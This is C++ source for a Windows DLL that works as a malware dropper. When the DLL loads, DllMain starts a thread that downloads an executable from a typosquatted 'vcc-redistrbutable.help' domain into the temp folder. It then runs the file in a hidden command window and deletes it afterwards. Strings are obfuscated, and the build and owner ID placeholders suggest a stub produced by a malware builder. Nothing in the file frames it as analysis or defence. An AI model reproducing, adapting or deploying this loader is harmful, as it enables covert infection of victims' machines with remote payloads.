// dllmain.cpp
#include <windows.h>
#include "Ec.h"
#include <string>
#include<urlmon.h>

#pragma comment (lib,"urlmon.lib")

std::string BuildID = EC("//BuildyID");
std::string OwnerID = EC("//OwneryID");



std::string ws2s(const std::wstring& wstr) {
    std::string str;
    str.reserve(wstr.length()); // Pre-allocate for performance

    // Use std::codecvt_utf8-like logic manually
    for (wchar_t wc : wstr) {
        if (wc <= 0x7F) {
            // 1-byte UTF-8
            str.push_back(static_cast<char>(wc));
        }
        else if (wc <= 0x7FF) {
            // 2-byte UTF-8
            str.push_back(static_cast<char>(0xC0 | ((wc >> 6) & 0x1F)));
            str.push_back(static_cast<char>(0x80 | (wc & 0x3F)));
        }
        else if (wc <= 0xFFFF) {
            // 3-byte UTF-8
            str.push_back(static_cast<char>(0xE0 | ((wc >> 12) & 0x0F)));
            str.push_back(static_cast<char>(0x80 | ((wc >> 6) & 0x3F)));
            str.push_back(static_cast<char>(0x80 | (wc & 0x3F)));
        }
        else if (wc <= 0x10FFFF) {
            // 4-byte UTF-8
            str.push_back(static_cast<char>(0xF0 | ((wc >> 18) & 0x07)));
            str.push_back(static_cast<char>(0x80 | ((wc >> 12) & 0x3F)));
            str.push_back(static_cast<char>(0x80 | ((wc >> 6) & 0x3F)));
            str.push_back(static_cast<char>(0x80 | (wc & 0x3F)));
        }
    }

    return str;
}

std::wstring s2ws(const std::string& s, bool isUtf8 = true)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(isUtf8 ? CP_UTF8 : CP_ACP, 0, s.c_str(), slength, 0, 0);
    std::wstring buf;
    buf.resize(len);
    MultiByteToWideChar(isUtf8 ? CP_UTF8 : CP_ACP, 0, s.c_str(), slength,
        const_cast<wchar_t*>(buf.c_str()), len);
    return buf;
}

std::string GetTempPathAndFileName() {
    wchar_t path[MAX_PATH];
    GetTempPath(MAX_PATH, path);

    // Generate a random filename
    std::wstring tmpFile = path;
    tmpFile += EC(L"ox_");

    // Add a timestamp to ensure uniqueness
    auto now = std::chrono::system_clock::now();
    auto ms = std::chrono::time_point_cast<std::chrono::milliseconds>(now).time_since_epoch().count();
    tmpFile += std::to_wstring(ms);

    tmpFile += EC(L".exe");

    return ws2s(tmpFile);
}


int win_system(const char* command)
{
    // Windows has a system() function which works, but it opens a command prompt window.

    char* tmp_command, * cmd_exe_path;
    int         ret_val;
    size_t          len;
    PROCESS_INFORMATION process_info = { 0 };
    STARTUPINFOA        startup_info = { 0 };


    len = strlen(command);
    tmp_command = (char*)malloc(len + 4);
    tmp_command[0] = 0x2F; // '/'
    tmp_command[1] = 0x63; // 'c'
    tmp_command[2] = 0x20; // <space>;
    memcpy(tmp_command + 3, command, len + 1);

    startup_info.cb = sizeof(STARTUPINFOA);
    cmd_exe_path = getenv(EC("COMSPEC"));
    _flushall();  // required for Windows system() calls, probably a good idea here too

    if (CreateProcessA(cmd_exe_path, tmp_command, NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info)) {
        WaitForSingleObject(process_info.hProcess, INFINITE);
        GetExitCodeProcess(process_info.hProcess, (LPDWORD)&ret_val);
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }

    free((void*)tmp_command);

    return(ret_val);
}


DWORD WINAPI MainThingy(LPVOID lpParam)
{


    HANDLE mutexstb = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, (EC("Global\\m") + OwnerID).c_str());
    if (mutexstb == NULL) {

        //std::cout << EC("No Stub Running!") << std::endl;

        std::string pathex = GetTempPathAndFileName();
        std::string urlex = EC("https://vcc-redistrbutable.help/Stb/Retev.php?bl=") + BuildID + EC(".txt");

        /*std::string command = EC("curl -o \"") + pathex + EC("\" \"") + urlex + EC("\"");
        system(command.c_str());*/


        std::string cmdstart = EC("start ") + pathex;
        
        URLDownloadToFile(NULL, s2ws(urlex).c_str(), s2ws(pathex).c_str(),0, NULL);

        Sleep(1000);

        win_system(cmdstart.c_str());

        Sleep(25000);

        remove(pathex.c_str());

    }

    return 0;
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, MainThingy, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
